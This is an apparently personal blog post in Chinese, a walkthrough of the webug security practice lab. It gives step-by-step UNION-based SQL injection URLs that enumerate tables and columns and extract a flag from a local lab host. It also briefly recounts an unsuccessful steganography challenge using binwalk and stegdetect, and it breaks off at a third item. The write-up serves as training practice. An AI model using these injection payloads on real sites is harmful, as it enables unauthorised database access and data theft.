---
layout: post
author: "kele"
date: "2017-12-25"
title: "webug ♂ play 姿势"
tags: 
  - 总结
  - webug
---
# webug play 姿势

## 入门
1. sql注入payload    
感觉100年没做过sql注入了
首先爆列数,使用order by ,`http://192.168.86.128/pentest/test/sqli/sqltamp.php?gid=1'order by 4 %23`，注释只能使用#的url转码也就是`%23`
然后:   
`http://192.168.86.128/pentest/test/sqli/sqltamp.php?gid=1%27union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23`   
获得表名:`flag`    
`http://192.168.86.128/pentest/test/sqli/sqltamp.php?gid=1%27union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='flag' %23`   
获得列名`flag`   
`http://192.168.86.128/pentest/test/sqli/sqltamp.php?gid=1%27union%20select 1,2,3,flag from flag%23`   
获得flag

2. 应该是一道misc的题目，首先使用binwalk 跑一遍，发现一个rar,`dd`提取出来，解压，一个txt内容是密码是`密码123`，想了半天，觉得应该是图片的隐写，百度无果，自己动手，丰衣足食，使用stegdetect检测，发现jphide的可能性最大，所以使用Jpseek提取，密码错误。。。。。。使用stegbreak爆破密码，无果，放弃。。。。。  
ps: 我还考虑过ntfs流，无果


3. 打开之后，